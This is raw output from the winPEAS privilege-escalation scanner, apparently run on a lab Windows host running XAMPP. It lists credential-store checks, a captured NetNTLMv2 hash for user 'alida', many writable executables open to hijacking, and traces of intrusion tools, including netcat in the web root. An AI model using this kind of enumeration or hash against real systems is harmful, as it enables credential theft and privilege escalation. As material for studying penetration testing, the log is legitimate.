  HKCU        IE5_UA_Backup_Flag                        5.0
  HKCU        ZonesSecurityUpgrade                      System.Byte[]
  HKCU        EmailName                                 User@
  HKCU        AutoConfigProxy                           wininet.dll
  HKCU        MimeExclusionListForCache                 multipart/mixed multipart/x-mixed-replace multipart/x-byteranges 
  HKCU        WarnOnPost                                System.Byte[]
  HKCU        UseSchannelDirectly                       System.Byte[]
  HKCU        EnableHttp1_1                             1
  HKCU        UrlEncoding                               0
  HKCU        SecureProtocols                           2720
  HKCU        PrivacyAdvanced                           0
  HKCU        DisableCachingOfSSLPages                  1
  HKCU        WarnonZoneCrossing                        1
  HKCU        CertificateRevocation                     1
  HKCU        EnableNegotiate                           1
  HKCU        MigrateProxy                              1
  HKCU        ProxyEnable                               0
  HKLM        CodeBaseSearchPath                        CODEBASE
  HKLM        EnablePunycode                            1
  HKLM        WarnOnIntranet                            1
  HKLM        MinorVersion                              0
  HKLM        ActiveXCache                              C:\Windows\Downloaded Program Files

  Zone Maps
  No URLs configured

  Zone Auth Settings
  No Zone Auth Settings


�����������������������������������͹ Windows Credentials �������������������������������������

����������͹ Checking Windows Vault
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault
  [ERROR] Unable to enumerate vaults. Error (0x1061)
    Not Found

����������͹ Checking Credential manager
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


  [!] Unable to enumerate credentials automatically, error: 'Win32Exception: System.ComponentModel.Win32Exception (0x80004005): Element not found'
Please run: 
cmdkey /list

����������͹ Saved RDP connections
    Not Found

����������͹ Remote Desktop Server/Client Settings
  RDP Server Settings
    Network Level Authentication            :       
    Block Clipboard Redirection             :       
    Block COM Port Redirection              :       
    Block Drive Redirection                 :       
    Block LPT Port Redirection              :       
    Block PnP Device Redirection            :       
    Block Printer Redirection               :       
    Allow Smart Card Redirection            :       

  RDP Client Settings
    Disable Password Saving                 :       True
    Restricted Remote Administration        :       False

����������͹ Recently run commands
    a: cmd\1
    MRUList: a

����������͹ Checking for DPAPI Master Keys
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
    MasterKey: C:\Users\alida\AppData\Roaming\Microsoft\Protect\S-1-5-21-4111689039-3755366186-3548469937-1001\994c371b-f5c0-48e9-b421-744600ded624
    Accessed: 5/7/2024 12:31:15 PM
    Modified: 5/7/2024 12:31:15 PM
   =================================================================================================


����������͹ Checking for DPAPI Credential Files
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
    Not Found

����������͹ Checking for RDCMan Settings Files
� Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#remote-desktop-credential-manager
    Not Found

����������͹ Looking for Kerberos tickets
�  https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
    Not Found

����������͹ Looking for saved Wifi credentials
  [X] Exception: Unable to load DLL 'wlanapi.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)
Enumerating WLAN using wlanapi.dll failed, trying to enumerate using 'netsh'
No saved Wifi credentials found

����������͹ Looking AppCmd.exe
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd.exe
    Not Found
      You must be an administrator to run this check

����������͹ Looking SSClient.exe
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#scclient-sccm
    Not Found

����������͹ Enumerating SSCM - System Center Configuration Manager settings

����������͹ Enumerating Security Packages Credentials
  Version: NetNTLMv2
  Hash:    alida::WEBWIN01-APOLLO:1122334455667788:031318fa53c2cb573845ff803580eb93:01010000000000000df88518b8a0da011ee5cd924a1b5c0f0000000008003000300000000000000000000000002000008cc2dbdd325fc75221a687eec7bd0cb94f9fe1ab54126c3ad690252abac3b9040a00100000000000000000000000000000000000090000000000000000000000

   =================================================================================================



�����������������������������������͹ Browsers Information �������������������������������������

����������͹ Showing saved credentials for Firefox
    Info: if no credentials were listed, you might need to close the browser and try again.

����������͹ Looking for Firefox DBs
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

����������͹ Looking for GET credentials in Firefox history
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

����������͹ Showing saved credentials for Chrome
    Info: if no credentials were listed, you might need to close the browser and try again.

����������͹ Looking for Chrome DBs
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

����������͹ Looking for GET credentials in Chrome history
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

����������͹ Chrome bookmarks
    Not Found

����������͹ Showing saved credentials for Opera
    Info: if no credentials were listed, you might need to close the browser and try again.

����������͹ Showing saved credentials for Brave Browser
    Info: if no credentials were listed, you might need to close the browser and try again.

����������͹ Showing saved credentials for Internet Explorer (unsupported)
    Info: if no credentials were listed, you might need to close the browser and try again.

����������͹ Current IE tabs
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
  [X] Exception: System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.Runtime.InteropServices.COMException: The server process could not be started because the configured identity is incorrect. Check the username and password. (Exception from HRESULT: 0x8000401A)
   --- End of inner exception stack trace ---
   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)
   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)
   at winPEAS.KnownFileCreds.Browsers.InternetExplorer.GetCurrentIETabs()
    Not Found

����������͹ Looking for GET credentials in IE history
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history


����������͹ IE history -- limit 50

    http://go.microsoft.com/fwlink/p/?LinkId=255141

����������͹ IE favorites
    http://go.microsoft.com/fwlink/p/?LinkId=255142


�����������������������������������͹ Interesting files and registry �������������������������������������

����������͹ Putty Sessions
    Not Found

����������͹ Putty SSH Host keys
    Not Found

����������͹ SSH keys in registry
� If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#ssh-keys-in-registry
    Not Found

����������͹ SuperPutty configuration files

����������͹ Enumerating Office 365 endpoints synced by OneDrive.

    SID: S-1-5-19
   =================================================================================================

    SID: S-1-5-20
   =================================================================================================

    SID: S-1-5-21-4111689039-3755366186-3548469937-1001
   =================================================================================================

    SID: S-1-5-18
   =================================================================================================


����������͹ Cloud Credentials
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    Not Found

����������͹ Unattend Files

����������͹ Looking for common SAM & SYSTEM backups

����������͹ Looking for McAfee Sitelist.xml Files

����������͹ Cached GPP Passwords

����������͹ Looking for possible regs with creds
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#inside-the-registry
    Not Found
    Not Found
    Not Found
    Not Found

����������͹ Looking for possible password files in users homes
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files

����������͹ Searching for Oracle SQL Developer config files


����������͹ Slack files & directories
  note: check manually if something is found

����������͹ Looking for LOL Binaries and Scripts (can be slow)
�  https://lolbas-project.github.io/
   [!] Check skipped, if you want to run it, please specify '-lolbas' argument

����������͹ Enumerating Outlook download files


����������͹ Enumerating machine and user certificate files


����������͹ Searching known files that can contain creds in home
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files

����������͹ Looking for documents --limit 100--
    C:\Users\alida\Documents\accounts.xlsx

����������͹ Office Most Recent Files -- limit 50

  Last Access Date           User                                           Application           Document

����������͹ Recent files --limit 70--
    Not Found

����������͹ Looking inside the Recycle Bin for creds files
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    Not Found

����������͹ Searching hidden files or folders in C:\Users home (can be slow)

     C:\Users\Default User
     C:\Users\Default
     C:\Users\All Users
     C:\Users\Default

����������͹ Searching interesting files in other users home directories (can be slow)

     Checking folder: c:\users\administrator

   =================================================================================================


����������͹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
     File Permissions "C:\xampp\mailtodisk\mailtodisk.exe": alida [AllAccess]
     File Permissions "C:\xampp\mysql\scripts\ctl.bat": alida [AllAccess]
     File Permissions "C:\xampp\php\phpunit.bat": alida [AllAccess]
     File Permissions "C:\xampp\php\phpdbg.exe": alida [AllAccess]
     File Permissions "C:\xampp\php\php.exe": alida [AllAccess]
     File Permissions "C:\xampp\php\php-win.exe": alida [AllAccess]
     File Permissions "C:\xampp\php\php-cgi.exe": alida [AllAccess]
     File Permissions "C:\xampp\php\pecl.bat": alida [AllAccess]
     File Permissions "C:\xampp\php\peardev.bat": alida [AllAccess]
     File Permissions "C:\xampp\php\pear.bat": alida [AllAccess]
     File Permissions "C:\xampp\php\pciconf.bat": alida [AllAccess]
     File Permissions "C:\xampp\php\pci.bat": alida [AllAccess]
     File Permissions "C:\xampp\php\deplister.exe": alida [AllAccess]
     File Permissions "C:\xampp\php\scripts\pciconf.bat": alida [AllAccess]
     File Permissions "C:\xampp\php\scripts\compatinfo.bat": alida [AllAccess]
     File Permissions "C:\xampp\php\extras\openssl\openssl.exe": alida [AllAccess]
     File Permissions "C:\xampp\src\xampp-usb-lite\setup_xampp.bat": alida [AllAccess]
     File Permissions "C:\xampp\src\xampp-usb-lite\make-usb-xampp.bat": alida [AllAccess]
     File Permissions "C:\xampp\src\xampp-nsi-installer\xa-icons\portcheck.bat": alida [AllAccess]
     File Permissions "C:\xampp\tmp\program.exe": alida [AllAccess]
     File Permissions "C:\xampp\tmp\winPEASx64.exe": alida [AllAccess]
     File Permissions "C:\xampp\apache\makecert.bat": alida [AllAccess]
     File Permissions "C:\xampp\apache\apache_uninstallservice.bat": alida [AllAccess]
     File Permissions "C:\xampp\apache\apache_installservice.bat": alida [AllAccess]
     File Permissions "C:\xampp\apache\bin\ab.exe": alida [AllAccess]
     File Permissions "C:\xampp\apache\bin\abs.exe": alida [AllAccess]
     File Permissions "C:\xampp\apache\bin\ApacheMonitor.exe": alida [AllAccess]
     File Permissions "C:\xampp\apache\bin\curl.exe": alida [AllAccess]
     File Permissions "C:\xampp\apache\bin\htcacheclean.exe": alida [AllAccess]
     File Permissions "C:\xampp\apache\bin\htdbm.exe": alida [AllAccess]
     File Permissions "C:\xampp\apache\bin\htdigest.exe": alida [AllAccess]
     File Permissions "C:\xampp\apache\bin\htpasswd.exe": alida [AllAccess]
     File Permissions "C:\xampp\apache\bin\httpd.exe": alida [AllAccess]
     File Permissions "C:\xampp\apache\bin\httxt2dbm.exe": alida [AllAccess]
     File Permissions "C:\xampp\apache\bin\logresolve.exe": alida [AllAccess]
     File Permissions "C:\xampp\apache\bin\openssl.exe": alida [AllAccess]
     File Permissions "C:\xampp\apache\bin\pv.exe": alida [AllAccess]
     File Permissions "C:\xampp\apache\bin\rotatelogs.exe": alida [AllAccess]
     File Permissions "C:\xampp\apache\bin\wintty.exe": alida [AllAccess]
     File Permissions "C:\xampp\apache\scripts\ctl.bat": alida [AllAccess]
     File Permissions "C:\xampp\htdocs\nc.exe": alida [AllAccess]
     File Permissions "C:\xampp\install\awk.exe": alida [AllAccess]
     File Permissions "C:\xampp\install\portcheck.bat": alida [AllAccess]
     File Permissions "C:\xampp\apache_start.bat": alida [AllAccess]
     File Permissions "C:\xampp\apache_stop.bat": alida [AllAccess]
     File Permissions "C:\xampp\catalina_service.bat": alida [AllAccess]
     File Permissions "C:\xampp\catalina_start.bat": alida [AllAccess]
     File Permissions "C:\xampp\catalina_stop.bat": alida [AllAccess]
     File Permissions "C:\xampp\ctlscript.bat": alida [AllAccess]
     File Permissions "C:\xampp\filezilla_setup.bat": alida [AllAccess]
     File Permissions "C:\xampp\filezilla_start.bat": alida [AllAccess]
     File Permissions "C:\xampp\filezilla_stop.bat": alida [AllAccess]
     File Permissions "C:\xampp\mercury_start.bat": alida [AllAccess]
     File Permissions "C:\xampp\mercury_stop.bat": alida [AllAccess]
     File Permissions "C:\xampp\mysql_start.bat": alida [AllAccess]
     File Permissions "C:\xampp\mysql_stop.bat": alida [AllAccess]
     File Permissions "C:\xampp\service.exe": alida [AllAccess]
     File Permissions "C:\xampp\setup_xampp.bat": alida [AllAccess]
     File Permissions "C:\xampp\test_php.bat": alida [AllAccess]
     File Permissions "C:\xampp\uninstall.exe": alida [AllAccess]
     File Permissions "C:\xampp\xampp-control.exe": alida [AllAccess]
     File Permissions "C:\xampp\xampp_shell.bat": alida [AllAccess]
     File Permissions "C:\xampp\xampp_start.exe": alida [AllAccess]
     File Permissions "C:\xampp\xampp_stop.exe": alida [AllAccess]

����������͹ Looking for Linux shells/distributions - wsl.exe, bash.exe


�����������������������������������͹ File Analysis �������������������������������������

����������͹ Found MySQL Files
Folder: C:\xampp\mysql
Folder: C:\xampp\php\data\phpdocref\mysql
Folder: C:\xampp\licenses\mysql
Folder: C:\xampp\licenses\strawberry\licenses\mysql

����������͹ Found Apache-Nginx Files
File: C:\xampp\php\php.ini
; PHP's initialization file, generally called php.ini, is responsible for
; configuring many of the aspects of PHP's behavior.
; PHP attempts to find and load this configuration from a number of locations.
; 1. SAPI module specific location.
; 2. The PHPRC environment variable. (As of PHP 5.2.0)
; 3. A number of predefined registry keys on Windows (As of PHP 5.2.0)
; 6. The directory from the --with-config-file-path compile time option, or the
; See the PHP docs for more specific information.
; http://php.net/configuration.file
; beginning with a semicolon are silently ignored (as you probably guessed).
; Section headers (e.g. [Foo]) are also silently ignored, even though
; Directives following the section heading [PATH=/www/mysite] only
; following the section heading [HOST=www.example.com] only apply to
; special sections cannot be overridden by user-defined INI files or
; at runtime. Currently, [PATH=] and [HOST=] sections only work under
; http://php.net/ini.sections
; Directives are variables used to configure PHP or PHP extensions.
; There is no name validation.  If PHP can't find an expected
; The value can be a string, a number, a PHP constant (e.g. E_ALL or M_PI), one
; of the INI constants (On, Off, True, False, Yes, No and None) or an expression
; Expressions in the INI file are limited to bitwise operators and parentheses:
; Boolean flags can be turned on using the values 1, On, True or Yes.
; sign, or by using the None keyword:
;  foo = None    ; sets foo to an empty string
;  foo = "None"  ; sets foo to the string 'None'
; If you use constants in your value, and these constants belong to a
; dynamically loaded extension (either a PHP extension or a Zend extension),
; you may only use these constants *after* the line that loads the extension.
; PHP comes packaged with two INI files. One that is recommended to be used
; in production environments and one that is recommended to be used in
; development environments.
; php.ini-production contains settings which hold security, performance and
; compatibility with older or less security conscience applications. We
; recommending using the production ini in production and testing environments.
; php.ini-development is very similar to its production variant, except it is
; development version only in development environments, as errors shown to
; application users can inadvertently leak otherwise secure information.
; The following are all the settings which are different in either the production
; or development versions of the INIs with respect to PHP's default behavior.
;   Default Value: On
;   Development Value: On
;   Production Value: Off
;   Development Value: On
;   Production Value: Off
;   Production Value: E_ALL & ~E_DEPRECATED & ~E_STRICT
;   Default Value: On
;   Development Value: On
;   Production value: On
;   Development Value: On
;   Production Value: On
;   Development Value: 60 (60 seconds)
;   Production Value: 60 (60 seconds)
;   Production Value: 4096
;   Default Value: On
;   Production Value: Off
;   Default Value: None
;   Production Value: "GP"
; session.gc_divisor
;   Production Value: 1000
; session.hash_bits_per_character
;   Production Value: 5
;   Default Value: On
;   Production Value: Off
;   Development Value: On
;   Production Value: Off
;   Production Value: "a=href,area=href,frame=src,input=src,form=fakeentry"
;   Production Value: "GPCS"
; php.ini Options  ;
; To disable this feature set this option to empty value
; TTL for user-defined php.ini files (time-to-live) in seconds. Default is 300 seconds (5 minutes)
; Language Options ;
engine=On
; documents, however this remains supported for backward compatibility reasons.
; Note that this directive does not control the <?= shorthand tag, which can be
; Default Value: On
; Production Value: Off
; http://php.net/precision
precision=14
; Output buffering is a mechanism for controlling how much output data
; data to the client. If your application's output exceeds this setting, PHP
; Turning on this setting and managing its maximum buffer size can yield some
; interesting side-effects depending on your application and web server.
; as it gets it. On production servers, 4096 bytes is a good setting for performance
; reasons.
; Note: Output buffering can also be controlled via Output Buffering Control
;   functions.
;   On = Enabled and buffer is unlimited. (Use with caution)
; Production Value: 4096
; You can redirect all of the output of your scripts to a function.  For
; encoding will be transparently converted to the specified encoding.
; Setting any output handler automatically turns on output buffering.
; Note: People who wrote portable scripts should not depend on this ini
; Note: You cannot use both "mb_output_handler" with "ob_iconv_handler"
;   and you cannot use both "ob_gzhandler" and "zlib.output_compression".
; Note: output_handler must be empty if this is set 'On' !!!!
; Transparent output compression using the zlib library
; Valid values for this option are 'off', 'on', or a specific buffer size
; to be used for compression (default is 4KB)
; Note: Resulting chunk size may vary due to nature of compression. PHP
;   compression. If you prefer a larger chunk size for better
;   performance, enable output_buffering in addition.
; http://php.net/zlib.output-compression
zlib.output_compression=Off
; http://php.net/zlib.output-compression-level
;zlib.output_compression_level = -1
; You cannot specify additional output handlers if zlib.output_compression
; PHP function flush() after each and every call to print() or echo() and each
; and every HTML block.  Turning this option on has serious performance
; implications and is generally recommended for debugging purposes only.
; Note: This directive is hardcoded to On for the CLI SAPI
; The unserialize callback function will be called (with the undefined class'
; which should be instantiated. A warning appears if the specified function is
; not defined, or if the function doesn't include/implement the missing class.
; So only set this entry, if you really want to implement such a
; callback-function.
; When floats & doubles are serialized store serialize_precision significant
serialize_precision=17
; open_basedir, if set, limits all file operations to the defined directory
; or per-virtualhost web server configuration file.
; This directive allows you to disable certain functions for security reasons.
; It receives a comma-delimited list of function names.
; http://php.net/disable-functions
disable_functions=
; This directive allows you to disable certain classes for security reasons.
; the request. Consider enabling it if executing long requests, which may end up
;ignore_user_abort = On
; be increased on systems where PHP opens many files to reflect the quantity of
; the file operations performed.
; Duration of time, in seconds for which to cache realpath information for a given
; file or directory. For systems with rarely changing files, consider increasing this
zend.enable_gc=On
; encodings.  To use this feature, mbstring extension must be enabled.
; Only affects if zend.multibyte is set.
; Decides whether PHP may expose the fact that it is installed on the server
; on your server or not.
expose_php=On
; Maximum execution time of each script, in seconds
; http://php.net/max-execution-time
max_execution_time=30
; idea to limit this time on productions servers in order to eliminate unexpectedly
; long running scripts.
; Development Value: 60 (60 seconds)
; Production Value: 60 (60 seconds)
; Maximum amount of memory a script may consume (128MB)
; it to take action for. The recommended way of setting values for this
; directive is through the use of the error level constants and bitwise
; operators. The error level constants are below here for convenience as well as
; some common settings and their meanings.
; By default, PHP is set to take action on all errors, notices and warnings EXCEPT
; recommended coding standards in PHP. For performance reasons, this is the
; recommend error reporting setting. Your production server shouldn't be wasting
; Error Level Constants:
; E_WARNING         - run-time warnings (non-fatal errors)
;                     intentional (e.g., using an uninitialized variable and
;                     relying on the fact it is automatically initialized to an
; E_CORE_WARNING    - warnings (non-fatal errors) that occur during PHP's
; E_COMPILE_WARNING - compile-time warnings (non-fatal errors)
; E_DEPRECATED      - warn about code that will not work in future versions
; E_USER_DEPRECATED - user-generated deprecation warnings
; Common Values:
;   E_COMPILE_ERROR|E_RECOVERABLE_ERROR|E_ERROR|E_CORE_ERROR  (Show only errors)
; Production Value: E_ALL & ~E_DEPRECATED & ~E_STRICT
; This directive controls whether or not and where PHP will output errors,
; it could be very dangerous in production environments. Depending on the code
; which is triggering the error, sensitive information could potentially leak
; out of your application such as database usernames and passwords or worse.
; For production environments, we recommend logging errors rather than
;   stderr = Display errors to STDERR (affects only CGI/CLI binaries!)
;   On or stdout = Display errors to STDOUT
; Default Value: On
; Development Value: On
; Production Value: Off
display_errors=On
; errors from clients. Turning the display of startup errors on can be useful in
; debugging configuration problems. We strongly recommend you
; set this to 'off' for production servers.
; Development Value: On
; Production Value: Off
display_startup_errors=On
; Besides displaying errors, PHP can also log errors to locations such as a
; server-specific log, STDERR, or a location specified by the error_log
; directive found below. While errors should not be displayed on productions
; servers they should still be monitored and logging is a great way to do that.
; Development Value: On
; Production Value: On
log_errors=On
; Set maximum length of log_errors. In error_log information about the source is
; Do not log repeated messages. Repeated errors must occur in same file on same
; is On you will not log errors with repeated messages from different files or
; If this parameter is set to Off, then memory leaks will not be shown (on
; stdout or in the log). This has only effect in a debug compile, and if
report_memleaks=On
; This setting is on by default.
; to On can assist in debugging and is appropriate for development servers. It should
; however be disabled on production servers.
; Development Value: On
; Production Value: Off
track_errors=On
; error message as HTML for easier reading. This directive controls whether
; Default Value: On
; Development Value: On
; Production value: On
html_errors=On
; If html_errors is set to On *and* docref_root is not empty, then PHP
; or function causing the error in detail.
; leading '/'. You must also specify the file extension being used including
; case no links to documentation are generated.
; Note: Never use this feature for production boxes.
; Log errors to syslog (Event Log on Windows).
; Production value: 0
; NOTE: Every character in this directive is considered as separator!
; starts up. G,P,C,E & S are abbreviations for the following respective super
; paid for the registration of these arrays and because ENV is not as commonly
; used as the others, ENV is not recommended on productions servers. You
; can still get access to the environment variables through getenv() should you
; Production Value: "GPCS";
; EXCEPT one. Leaving this value empty will cause PHP to use the value set
; Default Value: None
; Production Value: "GP"
; runs. $argv contains an array of all the arguments passed to PHP when a script
; is invoked. $argc contains an integer representing the number of arguments
; enabled, registering these variables consumes CPU cycles and memory each time
; a script is executed. For performance reasons, this feature should be disabled
; on production servers.
; Note: This directive is hardcoded to On for the CLI SAPI
; Default Value: On
; Production Value: Off
; variables are not used within a script, having this directive on will result
auto_globals_jit=On
; This option is enabled by default.
; Most likely, you won't want to disable this option globally. It causes $_POST
; and $_FILES to always be empty; the only way you will be able to read the
; to proxy requests or to process the POST data in a memory efficient fashion.
; By default, PHP will output a media type using the Content-Type header. To
; to disable this feature and it will be removed in a future version.
; The root of the PHP pages, used only if nonempty.
; see documentation for security issues.  The alternate is to use the
; cgi.force_redirect configuration below
; The directory under which PHP opens the script using /~username used only
; if nonempty.
; Directory in which the loadable extensions (modules) reside.
; http://php.net/extension-dir
; extension_dir = "./"
; On windows:
extension_dir="C:\xampp\php\ext"
; Whether or not to enable the dl() function.  The dl() function does NOT work
; disabled on them.
; most web servers.  Left undefined, PHP turns this on by default.  You can
; if cgi.force_redirect is turned on, and you are not running under Apache or Netscape
; (iPlanet) web servers, you MAY need to set an environment variable name that PHP
; will look for to know it is OK to continue execution.  Setting this variable MAY
; what PATH_INFO is.  For more information on PATH_INFO, see the cgi specs.  Setting
; this to 1 will cause PHP CGI to fix its paths to conform to the spec.  A setting
; FastCGI under IIS (on WINNT based OS) supports the ability to impersonate
; security context that the request runs under.  mod_fastcgi under Apache
; http://php.net/fastcgi.impersonate
;fastcgi.impersonate = 1
; Disable logging through FastCGI connection. PHP's default behavior is to enable
; cgi.rfc2616_headers configuration option tells PHP what type of headers to
; use when sending HTTP response code. If set to 0, PHP sends Status: header that
; is supported by Apache. When this option is set to 1, PHP will send
; cgi.check_shebang_line controls whether CGI PHP checks for line starting with #!
; script support running both as stand-alone script and via PHP CGI<. PHP in CGI
; mode skips this line and ignores its content if this directive is turned on.
file_uploads=On
allow_url_fopen=On
; Define the anonymous ftp password (your email address). PHP's default setting
; Default timeout for socket based streams (seconds)
; or you are running on a Mac and need to deal with files from
; Dynamic Extensions ;
; If you wish to have an extension loaded automatically, use the following
;   extension=modulename.extension
; For example, on Windows:
;   extension=msql.dll
;   extension=msql.so
;   extension=/path/to/extension/msql.so
; If you only provide the name of the extension, PHP will look for it in its
; default extension directory.
; Windows Extensions
; Note that many DLL files are located in the extensions/ (PHP 4) ext/ (PHP 5)
; extension folders as well as the separate PECL DLL download (PHP 5).
; Be sure to appropriately set the extension_dir directive.
extension=php_bz2.dll
extension=php_curl.dll
extension=php_fileinfo.dll
extension=php_gd2.dll
extension=php_gettext.dll
;extension=php_gmp.dll
;extension=php_intl.dll
;extension=php_imap.dll
;extension=php_interbase.dll
;extension=php_ldap.dll
extension=php_mbstring.dll
extension=php_exif.dll      ; Must be after mbstring as it depends on it
extension=php_mysql.dll
extension=php_mysqli.dll
;extension=php_oci8_12c.dll  ; Use with Oracle Database 12c Instant Client
;extension=php_openssl.dll
;extension=php_pdo_firebird.dll
extension=php_pdo_mysql.dll
;extension=php_pdo_oci.dll
;extension=php_pdo_odbc.dll
;extension=php_pdo_pgsql.dll
extension=php_pdo_sqlite.dll
;extension=php_pgsql.dll
;extension=php_shmop.dll
; The MIBS data available in the PHP distribution must be installed. 
; See http://www.php.net/manual/en/snmp.installation.php 
;extension=php_snmp.dll
;extension=php_soap.dll
;extension=php_sockets.dll
;extension=php_sqlite3.dll
;extension=php_sybase_ct.dll
;extension=php_tidy.dll
;extension=php_xmlrpc.dll
;extension=php_xsl.dll
display_startup_errors=On
y2k_compliance=On
register_long_arrays=Off
extension=php_openssl.dll
cli_server.color=On
; Defines the default timezone used by the date functions
; http://php.net/date.timezone
;date.timezone =
; http://php.net/date.default-longitude
;date.default_longitude = 35.2333
[iconv]
; If empty, default_charset or input_encoding or iconv.input_encoding is used.
; The precedence is: default_charset < intput_encoding < iconv.input_encoding
;iconv.input_encoding =
; If empty, default_charset or internal_encoding or iconv.internal_encoding is used.
; The precedence is: default_charset < internal_encoding < iconv.internal_encoding
;iconv.internal_encoding =
; If empty, default_charset or output_encoding or iconv.output_encoding is used.
; The precedence is: default_charset < output_encoding < iconv.output_encoding
; To use an output encoding conversion, iconv's output handler must be set
; otherwise output encoding conversion cannot be performed.
;iconv.output_encoding =
; happens within intl functions. The value is the level of the error produced.
;intl.use_exceptions = 0
;sqlite3.extension_dir =
;PCRE library recursion limit.
;Please note that if you set this value to a high number you may consume all
; http://php.net/pcre.recursion-limit
;pcre.recursion_limit=100000
; Whether to pool ODBC connections. Can be one of "strict", "relaxed" or "off"
; http://php.net/pdo-odbc.connection-pooling
;pdo_odbc.connection_pooling=strict
; Default socket name for local MySQL connects.  If empty, uses the built-in
; http://php.net/phar.readonly
;phar.readonly = On
;phar.require_hash = On
[mail function]
; For Win32 only.
; For Win32 only.
; For Unix only.  You may supply arguments as well (default: "sendmail -t -i").
; Force the addition of the specified parameters to be passed as extra parameters
mail.add_x_header=On
; Log mail to syslog (Event Log on Windows).
; Controls the ODBC cursor model.
odbc.allow_persistent=On
; Check that a connection is still valid before reuse.
odbc.check_persistent=On
; Maximum number of links (persistent + non-persistent).  -1 means no limit.
; Handling of LONG fields.  Returns number of bytes to variables.  0 means
; Handling of binary data.  0 means passthru, 1 return as is, 2 convert to char.
; See the documentation on odbc_binmode and odbc_longreadlen for an explanation
; Maximum number of links (persistent + non-persistent).  -1 means no limit.
; Default database name for ibase_connect().
; Default username for ibase_connect().
; Default password for ibase_connect().
; Default charset for ibase_connect().
mysql.allow_local_infile=On
mysql.allow_persistent=On
; Maximum number of links (persistent + non-persistent).  -1 means no limit.
; Default port number for mysql_connect().  If unset, mysql_connect() will use
; compile-time value defined MYSQL_PORT (in that order).  Win32 will only look
; Default socket name for local MySQL connects.  If empty, uses the built-in
; Default host for mysql_connect() (doesn't apply in safe mode).
; Default user for mysql_connect() (doesn't apply in safe mode).
; Default password for mysql_connect() (doesn't apply in safe mode).
; Maximum time (in seconds) for connect timeout. -1 means no limit
; http://php.net/mysql.connect-timeout
mysql.connect_timeout=60
; Trace mode. When trace_mode is active (=On), warnings for table/index scans and
;mysqli.allow_local_infile = On
mysqli.allow_persistent=On
; Default port number for mysqli_connect().  If unset, mysqli_connect() will use
; compile-time value defined MYSQL_PORT (in that order).  Win32 will only look
; Default socket name for local MySQL connects.  If empty, uses the built-in
; Default host for mysql_connect() (doesn't apply in safe mode).
; Default user for mysql_connect() (doesn't apply in safe mode).
; Default password for mysqli_connect() (doesn't apply in safe mode).
; Allow or prevent reconnect
mysqli.reconnect=Off
; Enable / Disable collection of general statistics by mysqlnd which can be
; used to tune and monitor MySQL operations.
mysqlnd.collect_statistics=On
; Enable / Disable collection of memory usage statistics by mysqlnd which can be
; used to tune and monitor MySQL operations.
mysqlnd.collect_memory_statistics=On
; Records communication from all extensions using mysqlnd to the specified log
; Timeout for network requests in seconds.
; SHA-256 Authentication Plugin related. File with the MySQL server public RSA
; Connection: Enables privileged connections using external
; http://php.net/oci8.privileged-connect
;oci8.privileged_connect = Off
; Connection: The maximum number of persistent OCI8 connections per
; Connection: The maximum number of seconds a process is allowed to
; maintain an idle persistent connection. Using -1 means idle
; persistent connections will be maintained forever.
; Connection: The number of seconds that must pass before issuing a
; ping during oci_pconnect() to check the connection validity. When
; set to 0, each oci_pconnect() will cause a ping. Using -1 disables
; Connection: Set this to a user chosen connection class to be used
; Connection Pooling (DRCP).  To use DRCP, this value should be set to
; the same string for all web servers running the same application,
; the database pool must be configured, and the connection string must
;oci8.connection_class =
; High Availability: Using On lets PHP receive Fast Application
; Notification (FAN) events generated when a database node fails. The
; database must also be configured to post FAN events.
; Tuning: This option enables statement caching, and specifies how
; rows that will be fetched automatically after statement execution.
; Compatibility. Using On means oci_close() will not close
; oci_connect() and oci_new_connect() connections.
pgsql.allow_persistent=On
; Detect broken persistent links always with pg_pconnect().
; Maximum number of links (persistent+non persistent).  -1 means no limit.
sybct.allow_persistent=On
; Maximum number of links (persistent + non-persistent).  -1 means no limit.
; Set per-context timeout
; The maximum time in seconds to wait for a connection attempt to succeed before returning failure.
; Default: one minute
; The name of the host you claim to be connecting from, for display by sp_who.
; Default: none
; Number of decimal digits for all bcmath functions.
[Session]
; http://php.net/session.save-handler
session.save_handler=files
; variable in order to use PHP's session functions.
;     session.save_path = "N;/path"
; where N is an integer.  Instead of storing all the session files in
; store the session data in those directories.  This is useful if
; your OS has problems with many files in one directory, and is
; a more efficient layout for servers that handle many sessions.
;         You can use the script in the ext/session dir for that purpose.
; NOTE 2: See the section on garbage collection below if you choose to
;         use subdirectories for session storage
